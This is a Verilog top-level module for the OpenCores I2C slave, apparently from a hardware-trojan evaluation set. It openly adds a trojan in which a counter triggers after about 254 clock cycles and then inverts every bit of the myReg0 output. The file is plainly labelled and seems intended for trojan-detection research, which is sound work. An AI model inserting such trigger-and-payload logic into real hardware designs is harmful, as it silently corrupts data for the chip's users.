//////////////////////////////////////////////////////////////////////
////                                                              ////
//// i2cSlaveTop.v                                                ////
//// OpenCores i2cSlave - Trojan Evaluation Version              ////
////                                                              ////
//////////////////////////////////////////////////////////////////////

`include "i2cSlave_define.v"

module i2cSlaveTop (
  clk,
  rst,
  sda,
  scl,
  myReg0
);

input clk;
input rst;
inout sda;
input scl;
output [7:0] myReg0;


/* ==============================================================
   Original OpenCores I2C Slave
   ============================================================== */

wire [7:0] clean_myReg0;

i2cSlave u_i2cSlave(
  .clk(clk),
  .rst(rst),
  .sda(sda),
  .scl(scl),
  .myReg0(clean_myReg0),
  .myReg1(),
  .myReg2(),
  .myReg3(),
  .myReg4(8'h12),
  .myReg5(8'h34),
  .myReg6(8'h56),
  .myReg7(8'h78)
);


/* ==============================================================
   Hardware Trojan
   Counter-based rare trigger + output manipulation payload
   ============================================================== */

reg [7:0] activation_count;
reg       activation_flag;

wire [7:0] data_mask;


/* Counter-based trigger */
always @(posedge clk) begin

  if (rst) begin
    activation_count <= 8'h00;
    activation_flag <= 1'b0;
  end

  else begin

    if (activation_count < 8'hFE)
      activation_count <= activation_count + 1'b1;

    if (activation_count == 8'hFE)
      activation_flag <= 1'b1;

  end

end


/* Payload */
assign data_mask = clean_myReg0 ^ 8'hFF;


/* Triggered payload activation */
assign myReg0 =
       activation_flag ?
       data_mask :
       clean_myReg0;


endmodule